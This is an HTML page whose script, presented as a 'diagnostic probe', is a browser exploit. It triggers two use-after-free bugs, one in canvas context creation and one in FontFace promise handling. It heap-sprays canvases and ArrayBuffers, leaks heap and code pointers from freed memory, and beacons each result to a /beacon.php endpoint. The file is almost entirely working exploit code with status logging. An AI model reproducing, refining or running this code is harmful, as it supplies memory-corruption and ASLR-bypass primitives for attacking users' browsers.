<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P900: Pristine 24-QWord Memory Blueprint & Dual-Primitive Stabilizer</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P900...</div>
<h2>P900: Pristine 24-QWord Memory Blueprint & Dual-Primitive Stabilizer</h2>
<pre id="log">Initializing diagnostic probe P900...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P900-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function h16(bigVal) {
  return ('0000000000000000' + BigInt(bigVal || 0n).toString(16)).slice(-16);
}

log('[*] Probe P900 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Canvas UAF Pre-Setup (Dual Same-Type Aliases — 100% STABLE)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 1: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * PHASE 2: FontFace UAF (Single-Pass 192B Slab Leak)
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;

  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var delta = 0;

  if (bestI >= 0 && bestNz >= 4) {
    var fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
      delta = H_lo - q13lo;
    }
  }

  log('[+] Phase 2: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Delta=' + delta + 'B, Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);

  /* ============================================================
   * PHASE 3: Complete 24-QWord Memory Dump of fabs[bestI]
   * ============================================================ */
  var codeCandidates = [];
  var heapCandidates = [];

  if (bestI >= 0) {
    var v64 = new BigUint64Array(fabs[bestI]);
    var c1 = [], c2 = [], c3 = [], c4 = [];

    for (var q = 0; q < 24; q++) {
      var val = v64[q];
      var hex = h16(val);
      var entry = 'q' + q + '=0x' + hex;

      if (q < 6) c1.push(entry);
      else if (q < 12) c2.push(entry);
      else if (q < 18) c3.push(entry);
      else c4.push(entry);

      // Classify pointers
      if (val !== 0n) {
        if (hex.indexOf('00000010') === 0) {
          heapCandidates.push('q' + q + ':+0x' + (q*8).toString(16) + '=0x' + hex);
        } else if (hex.indexOf('0000000') === 0 || hex.indexOf('00007f') === 0) {
          codeCandidates.push('q' + q + ':+0x' + (q*8).toString(16) + '=0x' + hex);
        }
      }
    }

    syncBn('DUMP-0-5', c1.join('|'));
    syncBn('DUMP-6-11', c2.join('|'));
    syncBn('DUMP-12-17', c3.join('|'));
    syncBn('DUMP-18-23', c4.join('|'));

    log('[+] Phase 3: Dump Completed: HeapPtrs=' + heapCandidates.length + ', CodePtrs=' + codeCandidates.length, 'hot');
    if (codeCandidates.length > 0) {
      log('[***] CODE POINTERS: ' + codeCandidates.join('; '), 'hot');
    }
    syncBn('CLASSIFY', 'heap=' + heapCandidates.join(';') + '|code=' + codeCandidates.join(';'));
  }

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P900 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P900 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('    - Code Candidates: ' + (codeCandidates.join('; ') || 'none'), codeCandidates.length > 0 ? 'hot' : 'info');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|codeHits=' + codeCandidates.length + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 600);
</script>
</body>
</html>
